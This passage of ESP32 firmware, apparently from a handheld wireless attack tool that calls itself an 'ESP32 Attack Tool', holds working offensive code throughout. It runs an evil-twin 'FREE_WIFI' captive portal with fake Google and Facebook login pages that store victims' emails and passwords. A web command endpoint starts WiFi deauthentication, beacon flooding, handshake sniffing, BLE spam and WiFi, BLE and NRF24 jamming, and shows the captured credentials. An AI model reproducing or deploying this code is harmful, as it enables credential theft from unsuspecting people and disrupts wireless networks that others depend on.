String evilChoice = "google";

void startWebServer() {
    if (webRunning) return;
    WiFi.softAP(AP_SSID, AP_PASSWORD);
    server.on("/", []() { server.send(200, "text/html", index_html); });
    server.on("/portal.html", []() { server.send(200, "text/html", evilChoice == "google" ? google_page : facebook_page); });
    server.on("/tv.html", []() { server.send(200, "text/html", tv_page); });
    server.on("/cmd", []() {
        if (!server.hasArg("c")) { server.send(200, "text/plain", "NO CMD"); return; }
        String c = server.arg("c");
        if (c == "scan") scanWiFi();
        else if (c == "deauth") startDeauth();
        else if (c == "deauth_stop") stopDeauth();
        else if (c == "beacon") startBeacon();
        else if (c == "beacon_stop") stopBeacon();
        else if (c == "handshake") startHandshake();
        else if (c == "jam") startJammer();
        else if (c == "evil") startEvil();
        else if (c == "evil_stop") stopEvil();
        else if (c == "ble_scan") bleScan();
        else if (c == "ble_apple") bleApple();
        else if (c == "ble_samsung") bleSamsung();
        else if (c == "ble_all") bleAll();
        else if (c == "ble_jam") bleJammer();
        else if (c == "nrf_scan") nrfScan();
        else if (c == "nrf_jam") nrfJam();
        else if (c == "nrf_send") nrfSend();
        else if (c == "connect") selectWiFiNetwork();
        else if (c == "deauth_mac") deauthByMAC();
        else if (c == "tv_power") irPower();
        else if (c == "tv_volup") irVolUp();
        else if (c == "tv_voldown") irVolDown();
        else if (c == "tv_chup") irChUp();
        else if (c == "tv_chdown") irChDown();
        else if (c == "web_on") startWebServer();
        else if (c == "web_off") stopWebServer();
        else if (c == "bright") setBrightness();
        else if (c == "format") clearData();
        else if (c == "about") about();
        else if (c == "view_pass") server.send(200, "text/plain", capturedPasswords);
        else if (c == "view_hand") server.send(200, "text/plain", handshakes);
        else if (c == "clear_pass") { capturedPasswords = ""; saveData(); }
        else if (c == "clear_hand") { handshakes = ""; saveData(); }
        else if (c == "reset") reboot();
        server.send(200, "text/plain", "OK");
    });
    server.on("/data", []() { String json = "{\"deauth\":" + String(deauthPackets) + ",\"beacon\":" + String(beaconPackets) + ",\"rssi\":" + String(lastRSSI) + ",\"blerssi\":-60,\"uptime\":" + String(millis()/1000) + "}"; server.send(200, "application/json", json); });
    server.on("/pass", HTTP_POST, []() { String email = server.hasArg("email") ? server.arg("email") : ""; String pwd = server.hasArg("pass") ? server.arg("pass") : ""; if (email.length() > 0 || pwd.length() > 0) capturedPasswords += "[PASS] Email:" + email + " Pass:" + pwd + "\n"; saveData(); server.send(200, "text/html", "<html><body><h3>Thanks!</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>"); });
    server.begin();
    webRunning = true;
    showSuccess("WEB SERVER", "192.168.4.1");
}
void stopWebServer() { server.stop(); WiFi.softAPdisconnect(true); webRunning = false; showSuccess("WEB STOPPED", ""); }
void startEvil() {
    if (evilActive) return;
    WiFi.softAP("FREE_WIFI", NULL);
    dnsServer.start(53, "*", WiFi.softAPIP());
    server.on("/", []() { server.send(200, "text/html", evilChoice == "google" ? google_page : facebook_page); });
    server.on("/pass", HTTP_POST, []() { String email = server.hasArg("email") ? server.arg("email") : ""; String pwd = server.hasArg("pass") ? server.arg("pass") : ""; if (email.length() > 0 || pwd.length() > 0) capturedPasswords += "[PASS] Email:" + email + " Pass:" + pwd + "\n"; saveData(); server.send(200, "text/html", "<html><body><h3>Thanks!</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>"); });
    server.begin();
    evilActive = true;
    showSuccess("EVIL PORTAL", "FREE_WIFI");
    while (evilActive) { dnsServer.processNextRequest(); server.handleClient(); if (btn(BTN_BACK)) evilActive = false; delay(100); }
    dnsServer.stop(); server.stop(); WiFi.softAPdisconnect(true); evilActive = false;
    showSuccess("EVIL STOPPED", "");
}
void stopEvil() { evilActive = false; }

void setBrightness() {
    while (true) {
        u8g2.clearBuffer(); updateTopBar();
        u8g2.setFont(u8g2_font_6x10_tr); u8g2.drawStr(40, 10, "BRIGHTNESS");
        u8g2.drawFrame(8, 32, 112, 12); u8g2.drawBox(8, 32, contrast * 112 / 255, 12);
        char buf[8]; sprintf(buf, "%d%%", contrast * 100 / 255);
        u8g2.setFont(u8g2_font_6x10_tr); int w = u8g2.getStrWidth(buf); u8g2.drawStr((128 - w) / 2, 52, buf);
        u8g2.drawStr(8, 30, "<"); u8g2.drawStr(110, 30, ">");
        u8g2.drawStr(2, 62, "LR=change  OK=save  BACK=exit");
        u8g2.sendBuffer();
        if (btn(BTN_LEFT) && contrast > 10) contrast -= 10;
        else if (btn(BTN_RIGHT) && contrast < 255) contrast += 10;
        else if (btn(BTN_OK)) { EEPROM.begin(32); EEPROM.write(1, contrast); EEPROM.commit(); EEPROM.end(); u8g2.setContrast(contrast); showSuccess("SAVED!", ""); break; }
        else if (btn(BTN_BACK)) break;
        delay(50);
    }
}
void showPass() { showSuccess("PASSWORDS", capturedPasswords.length() ? capturedPasswords.substring(0, 50).c_str() : "Немає"); }
void showHand() { showSuccess("HANDSHAKES", handshakes.length() ? handshakes.substring(0, 50).c_str() : "Немає"); }
void about() { showSuccess("DIY BRUCE v23.0", "ESP32 Attack Tool | WiFi | BLE | NRF | EVIL"); }

// ==================== МЕНЮ ====================
const char* moduleNames[] = {"WiFi","BLE","NRF24","IR","Tools","Settings"};
const int moduleCount = 6;
const unsigned char* moduleIcons[] = {wifi_40, ble_40, nrf_40, ir_40, tools_40, settings_40};

const char* wifiSub[] = {"SCAN","DEAUTH","BEACON","HANDSHAKE","JAM","EVIL","WEB","CONNECT","DEAUTH MAC","STOP","INFO","REBOOT"};
const int wifiSize = 12;
const char* bleSub[] = {"SCAN","APPLE","SAMSUNG","ALL","JAM","STOP","REBOOT"};
const int bleSize = 7;
const char* nrfSub[] = {"SCAN","JAM","SEND","STOP","REBOOT"};
const int nrfSize = 5;
const char* irSub[] = {"POWER","VOL+","VOL-","MUTE","STOP","REBOOT"};
const int irSize = 6;
const char* toolsSub[] = {"KEYBOARD","PING","I2C","REBOOT"};
const int toolsSize = 4;
const char* settingsSub[] = {"BRIGHT","WEB ON","WEB OFF","SHOW PASS","SHOW HAND","FORMAT","ABOUT","REBOOT"};
const int settingsSize = 8;

bool inSubMenu = false;
int currentModule = 0, currentSub = 0, subScroll = 0;
const int SUB_VISIBLE = 4;

void drawMainMenu() {
    u8g2.clearBuffer(); updateTopBar();
    int prev = (currentModule - 1 + moduleCount) % moduleCount;
    int next = (currentModule + 1) % moduleCount;
    u8g2.drawXBM(2, 17, 24, 24, moduleIcons[prev]);
    u8g2.drawXBM(102, 17, 24, 24, moduleIcons[next]);
    u8g2.drawRFrame(44, 12, 40, 40, 4);
    u8g2.drawXBM(48, 14, 32, 32, moduleIcons[currentModule]);
    u8g2.setFont(u8g2_font_7x13B_tr);
    int nw = u8g2.getStrWidth(moduleNames[currentModule]);
    u8g2.drawStr((128 - nw) / 2, 58, moduleNames[currentModule]);
    u8g2.drawStr(28, 36, "<"); u8g2.drawStr(93, 36, ">");
    u8g2.sendBuffer();
}

void drawSubMenu() {
    int size;
    const char* title;
    switch (currentModule) {
        case 0: title = "WiFi"; size = wifiSize; break;
        case 1: title = "BLE"; size = bleSize; break;
        case 2: title = "NRF24"; size = nrfSize; break;
        case 3: title = "IR"; size = irSize; break;
        case 4: title = "Tools"; size = toolsSize; break;
        default: title = "Settings"; size = settingsSize; break;
    }
    if (currentSub < subScroll) subScroll = currentSub;
    if (currentSub >= subScroll + SUB_VISIBLE) subScroll = currentSub - SUB_VISIBLE + 1;
    u8g2.clearBuffer(); updateTopBar();
    u8g2.drawBox(0, 11, 128, 12);
    u8g2.setDrawColor(0);
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(2, 21, title);
    u8g2.setDrawColor(1);
    u8g2.drawLine(0, 23, 128, 23);
    for (int i = 0; i < SUB_VISIBLE && (subScroll + i) < size; i++) {
        int idx = subScroll + i;
        int y = 26 + i * 10;
        const char* itemName;
        switch (currentModule) {
            case 0: itemName = wifiSub[idx]; break;
            case 1: itemName = bleSub[idx]; break;
            case 2: itemName = nrfSub[idx]; break;
            case 3: itemName = irSub[idx]; break;
            case 4: itemName = toolsSub[idx]; break;
            default: itemName = settingsSub[idx]; break;
        }
        if (idx == currentSub) {
            u8g2.drawBox(0, y-8, 128, 10);
            u8g2.setDrawColor(0);
            u8g2.drawXBM(2, y-6, 12, 12, folder_12);
            u8g2.drawXBM(16, y-6, 12, 12, scan_12);
            u8g2.setCursor(30, y);
            u8g2.print(itemName);
            u8g2.setDrawColor(1);
        } else {
            u8g2.drawXBM(2, y-6, 12, 12, folder_12);
            u8g2.drawXBM(16, y-6, 12, 12, scan_12);
            u8g2.setCursor(30, y);
            u8g2.print(itemName);
        }
    }
    if (size > SUB_VISIBLE) {
        int bh = max(5, (39 * SUB_VISIBLE) / size);
        int by = 23 + (subScroll * (39 - bh)) / max(1, size - SUB_VISIBLE);
        u8g2.drawBox(124, by, 3, bh);
    }
    u8g2.sendBuffer();
}

void executeAction() {
    switch (currentModule) {
        case 0:
            switch (currentSub) {
                case 0: scanWiFi(); break;
                case 1: startDeauth(); break;
                case 2: startBeacon(); break;
                case 3: startHandshake(); break;
                case 4: startJammer(); break;
                case 5: startEvil(); break;
                case 6: startWebServer(); break;
                case 7: selectWiFiNetwork(); break;
                case 8: deauthByMAC(); break;
                case 9: stopWiFiAttack(); break;
                case 10: showMessage("WiFi INFO", 1000); break;
                case 11: reboot(); break;
            } break;
        case 1:
            switch (currentSub) {
                case 0: bleScan(); break;
                case 1: bleApple(); break;
                case 2: bleSamsung(); break;
                case 3: bleAll(); break;
                case 4: bleJammer(); break;
                case 5: stopBLE(); break;
                case 6: reboot(); break;
            } break;
        case 2:
            switch (currentSub) {
                case 0: nrfScan(); break;
                case 1: nrfJam(); break;
                case 2: nrfSend(); break;
                case 3: stopNRF(); break;
                case 4: reboot(); break;
            } break;
        case 3:
            switch (currentSub) {
                case 0: irPower(); break;
                case 1: irVolUp(); break;
                case 2: irVolDown(); break;
                case 3: irMute(); break;
                case 4: irStop(); break;
                case 5: reboot(); break;
            } break;
        case 4:
            switch (currentSub) {
                case 0: toolsKeyboard(); break;
                case 1: showMessage("PING (sim)", 1000); break;
                case 2: showMessage("I2C SCAN", 1000); break;
                case 3: reboot(); break;
            } break;
        case 5:
            switch (currentSub) {
                case 0: setBrightness(); break;
                case 1: startWebServer(); break;
                case 2: stopWebServer(); break;
                case 3: showPass(); break;
                case 4: showHand(); break;
                case 5: clearData(); break;
                case 6: about(); break;
                case 7: reboot(); break;
            } break;
    }
}

// ==================== SETUP ====================
void setup() {
    Serial.begin(115200);
    pinMode(BTN_UP, INPUT_PULLUP); pinMode(BTN_DOWN, INPUT_PULLUP); pinMode(BTN_OK, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP); pinMode(BTN_RIGHT, INPUT_PULLUP); pinMode(BTN_BACK, INPUT_PULLUP);
    Wire.begin(21, 22);
    u8g2.begin();
    u8g2.setContrast(200);
    SPI.begin(18, 19, 23, NRF_CSN);
    radio.begin();
    if (radio.isChipConnected()) { radio.setChannel(76); radio.setPALevel(RF24_PA_LOW); nrfOK = true; }
    loadData();
    uptimeStart = millis();
    
    // Анімація з логотипом HYDRA
    for (int a = 255; a >= 0; a -= 15) {
        u8g2.clearBuffer();
        u8g2.drawXBM(32, 0, 64, 64, hydra_logo);
        u8g2.setContrast(a);
        u8g2.sendBuffer();
        delay(20);
    }
    u8g2.setContrast(200);
    u8g2.clearBuffer();
    u8g2.sendBuffer();
    delay(200);
    
    drawMainMenu();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(handshakeSniffer);
    WiFi.mode(WIFI_AP_STA);
}

// ==================== LOOP ====================
void loop() {
    if (webRunning) { dnsServer.processNextRequest(); server.handleClient(); }
    if (WiFi.softAPgetStationNum() > 0) lastRSSI = WiFi.RSSI();
    if (!inSubMenu) {
        if (btn(BTN_LEFT)) { currentModule = (currentModule - 1 + moduleCount) % moduleCount; drawMainMenu(); }
        else if (btn(BTN_RIGHT)) { currentModule = (currentModule + 1) % moduleCount; drawMainMenu(); }
        else if (btn(BTN_OK) || btn(BTN_DOWN)) { animateSlideDown(); inSubMenu = true; currentSub = 0; subScroll = 0; drawSubMenu(); }
    } else {
        int size = (currentModule==0?wifiSize:currentModule==1?bleSize:currentModule==2?nrfSize:currentModule==3?irSize:currentModule==4?toolsSize:settingsSize);
        if (btn(BTN_UP)) { if (currentSub > 0) currentSub--; else currentSub = size - 1; drawSubMenu(); }
        else if (btn(BTN_DOWN)) { if (currentSub < size - 1) currentSub++; else currentSub = 0; drawSubMenu(); }
        else if (btn(BTN_OK)) { executeAction(); if (currentSub != 11 && currentSub != 6 && currentSub != 5 && currentSub != 9 && currentSub != 8 && currentSub != 7) drawSubMenu(); else { inSubMenu = false; drawMainMenu(); } }
        else if (btn(BTN_BACK)) { animateSlideUp(); inSubMenu = false; drawMainMenu(); }
    }
    delay(20);
}
